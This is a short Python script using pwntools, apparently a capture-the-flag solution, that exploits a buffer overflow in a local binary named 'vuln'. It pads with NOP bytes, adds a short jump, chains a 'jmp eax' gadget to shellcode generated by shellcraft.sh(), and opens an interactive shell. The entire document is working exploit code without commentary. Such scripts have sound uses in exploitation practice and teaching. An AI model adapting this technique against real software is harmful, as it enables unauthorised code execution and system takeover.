from pwn import *

elf = ELF('vuln')
rop = ROP(elf)

jmp_eax = elf.search(asm('jmp eax;')).__next__()
rop.raw(jmp_eax)
rop.raw(asm(shellcraft.sh()))

payload = b'\x90'*(16+4+4+2)
payload += b'\xeb\x04'
payload += rop.chain()

p = process('vuln')
p.sendline(payload)
p.interactive()
